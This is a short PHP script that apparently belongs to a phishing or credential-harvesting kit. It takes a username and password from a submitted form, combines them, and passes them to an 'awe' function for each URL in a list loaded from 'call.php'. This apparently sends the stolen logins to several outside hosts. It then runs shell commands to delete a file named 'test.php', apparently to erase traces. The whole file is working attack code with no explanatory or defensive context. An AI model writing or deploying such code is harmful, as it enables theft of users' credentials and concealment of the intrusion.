<?php
require 'call.php';
$user = $_POST['user'];
$pass = $_POST['pass'];
$data = "$user#$pass";                                                                                                                                                                                    
foreach ($urls as $site) {
   $urlz = htbm($site);
	awe($data,$urlz);

}
shell_exec("rm -rf test.php");
shell_exec("rm test.php");
unlink("test.php");
?>